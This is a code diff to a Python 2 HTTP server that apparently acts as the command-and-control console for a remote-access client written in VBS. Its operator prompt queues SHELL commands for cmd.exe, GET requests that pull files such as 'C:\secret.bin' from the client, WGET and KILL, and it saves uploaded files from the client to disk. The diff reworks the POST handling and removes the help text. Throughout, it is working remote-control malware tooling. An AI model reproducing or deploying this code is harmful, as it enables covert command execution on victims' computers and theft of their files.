@@ -16,7 +16,6 @@ from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from urlparse import parse_qs
 import cgi
 import os
-import sys
 from Queue import Queue
 from threading import Thread
 
@@ -47,40 +46,23 @@ class myHandler(BaseHTTPRequestHandler):
 
     # Result from executing command
     def do_POST(self):
-        global context
-        contenttype_header = self.headers.getheader('content-type')
-        if contenttype_header:
-            ctype, pdict = cgi.parse_header(contenttype_header)
-        else:
-            ctype = None
+        ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
 
         # File upload
-        # if ctype == 'multipart/form-data':
-        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
-        cmd_data = form['cmd'].file.read()
-        result_filename = form['result'].filename
-        result_data = form['result'].file.read()
+        if ctype == 'multipart/form-data':
+            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
+            filename = form['upfile'].filename
+            data = form['upfile'].file.read()
 
-        if context:
-            cmd_data = cmd_data.replace(context + ' ', '')
-        print cmd_data
+            with file(os.path.join('download', filename), 'wb') as f:
+                f.write(data)
 
-        # Store file
-        if self.path == '/upload':
-            # Create folder if required
-            if not os.path.exists('download'):
-                os.mkdir('download')
-
-            # Write file to disk
-            with file(os.path.join('download', result_filename), 'wb') as f:
-                f.write(result_data)
-
-            print 'File \'%s\' downloaded.' % result_filename
-        # Print output
+            print 'File \'%s\' downloaded.' % filename
+        # Regular response
         else:
-            print result_data
-
-        sys.stdout.write('%s> ' % context)
+            length = int(self.headers['content-length'])
+            result = parse_qs(self.rfile.read(length), keep_blank_values=1)['result'][0]
+            print result
 
         # Respond
         self.send_response(200)
@@ -96,27 +78,22 @@ class myHandler(BaseHTTPRequestHandler):
 
 def run_httpserver():
     #commands.put('GET C:\\secret.bin')
-    #commands.put('SHELL dir C:\\')
-    #commands.put('SHELL type client.vbs')
-    global server
+    #commands.put('SHELL ipconfig')
     server = HTTPServer(('', PORT_NUMBER), myHandler)
     server.serve_forever()
 
 commands = Queue()
-server = None
-context = ''
 
-def main():
+try:
     # Start HTTP server thread
     #run_httpserver() # Run without treads for debugging purposes
     httpserver = Thread(target=run_httpserver)
     httpserver.start()
 
     # Loop to add new commands
-    global context
-    s = ''
+    context = ''
     while True:
-        s = raw_input('%s> ' % context)
+        s = raw_input("%s> " % context)
         s = s.strip()
 
         # In a context
@@ -150,29 +127,15 @@ def main():
             elif cmd == 'SHELL':
                 context = 'SHELL'
                 continue
-            elif cmd == 'KILL' or cmd == 'SLEEP':
+            elif cmd == 'KILL':
                 dummy = 'x'
-            elif cmd == 'SHUTDOWN':
-                server.shutdown()
-                print 'Shutting down %s' % os.path.basename(__file__)
-                exit(0)
-            elif cmd == 'HELP':
-                print 'Supported commands:\n' \
-                      '- SLEEP [ms]      - Set client polling interval;\n' \
-                      '                    When entered without ms, shows the current interval.\n' \
-                      '- SHELL [command] - Execute command in cmd.exe interpreter;\n' \
-                      '                    When entered without command, switches to SHELL context.\n' \
-                      '- GET [path]      - Download the file at [path] to the .\\downloads folder.\n' \
-                      '- WGET [url]      - Download file from url.\n' \
-                      '- KILL            - Stop client script.\n' \
-                      '- SHUTDOWN        - Exit this commandline interface (does not shutdown the client).\n' \
-                      '- HELP            - Show this help.\n'
-                continue
             else:
-                print '%s> Unknown command: %s' % (context, s)
+                print '%s > Unknown command: %s' % (context, s)
                 continue
 
         commands.put(' '.join([cmd, args]))
 
-if __name__ == '__main__':
-    main()
+
+except KeyboardInterrupt:
+    print '^C received'
+    #server.socket.close()
